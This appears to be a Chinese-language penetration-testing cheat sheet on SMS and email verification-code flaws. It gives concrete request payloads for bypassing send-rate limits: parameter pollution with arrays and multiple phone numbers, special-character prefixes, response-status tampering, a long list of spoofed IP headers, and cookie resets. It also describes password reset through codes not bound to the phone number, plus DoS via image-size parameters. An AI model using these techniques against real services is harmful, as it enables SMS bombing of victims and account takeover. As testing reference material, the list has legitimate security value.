# 短信邮件漏洞

## 轰炸漏洞

### WAF绕过

#### 前端校验

限制了次数，通过修改返回包，来绕过校验

#### 接口防护

一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口

#### 参数污染

参数大小写或者添加多个同名的参数或者将参数改为数组

举例

    phone=111*****123&phone=111*****456&phone=111*****789
    可能一次性3个手机号都接收到验证码
    也可以都写同一个手机号试试能不能接收到3次短信
    phone=111*****123,111*****456,111*****789
    {
    "phone": "111*****123,111*****456,111*****789"
    }
    phone=[111****1234,111****4567] 或 email=[test@aa.com,test@bb.com]
    加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号
     
     
    将参数改为数组形式绕过短信轰炸限制
    phone[]=111*****123 或 email[]=test@aa.com

#### 特殊符号绕过

    %00
    %0a
    %a0
    \n
    空格
    \r
    86(短信轰炸的情况，手机号前加该符号)
    +
    -
    ,
    .
    ;
    #
    @
    0
    +86(短信轰炸的情况，手机号前加该符号)
    086(短信轰炸的情况，手机号前加该符号)
    0086(短信轰炸的情况，手机号前加该符号)
    26个英文字符
    ......
     
    邮箱大小写，比如@qq.com 改为@Qq.com @qq.COm等
    
#### 修改返回值

举例

    Request
    phone=111*****123 或 email=test@aa.com
     
    Response
    {"status":"0","message":"发送太过频繁"}
     
    修改返回值绕过
    拦截返回包，将Response中的status值修改为1
    {"status":"1","message":"发送太过频繁"}
    
#### 修改IP绕过

    X-Forwarded-For: 36.63.19.215
    X-Forwarded: 36.63.19.215
    Forwarded-For: 36.63.19.215
    Forwarded: 36.63.19.215
    X-Requested-With: 36.63.19.215
    X-Forwarded-Proto: 36.63.19.215
    X-Forwarded-Host: 36.63.19.215
    X-remote-IP: 36.63.19.215
    X-remote-addr: 36.63.19.215
    True-Client-IP: 36.63.19.215
    X-Client-IP: 36.63.19.215
    Client-IP: 36.63.19.215
    X-Real-IP: 36.63.19.215
    Ali-CDN-Real-IP: 36.63.19.215
    Cdn-Src-Ip: 36.63.19.215
    Cdn-Real-Ip: 36.63.19.215
    CF-Connecting-IP: 36.63.19.215
    X-Cluster-Client-IP: 36.63.19.215
    WL-Proxy-Client-IP: 36.63.19.215
    Proxy-Client-IP: 36.63.19.215
    Fastly-Client-Ip: 36.63.19.215
    True-Client-Ip: 36.63.19.215
    X-Originating-IP: 36.63.19.215
    X-Host: 36.63.19.215
    X-Custom-IP-Authorization: 36.63.19.215
    
#### 修改Cookie绕过

删除cookie 或者 重新获取一个新的cookie,换个浏览器重新获取就行了

#### 并发绕过

使用多线程来发送短信/邮箱
    
## 弱耦合漏洞

### 验证码未与请求宿主绑定

#### 场景一

手机号1点击获取验证码，得到验证码

手机号2输入验证码，成功通过验证

#### 场景二

用户绑定了手机号，正常来说是获取绑定手机号的短信，通过修改成其他手机号，达到重置密码

1.获取验证码，抓包，把手机号A改成手机号B，手机号B收到验证码填上去

2.点击提交进行密码重置，抓包，将手机号A修改为手机号B

发现，成功重置了手机号A的密码

### 验证码未与特定功能点绑定

找回密码处获取短信验证码
然后到登陆处使用刚刚获取的短信验证码，成功通过验证。

## 验证码回显漏洞

验证码回显在返回包里

## DDOS

刷新验证码，若发现在请求头中有对验证码参数可控的操作（比如长度，宽度），可以尝试是否能引发DDOS

## 验证码内容可控

请求包部分内容在短信上显示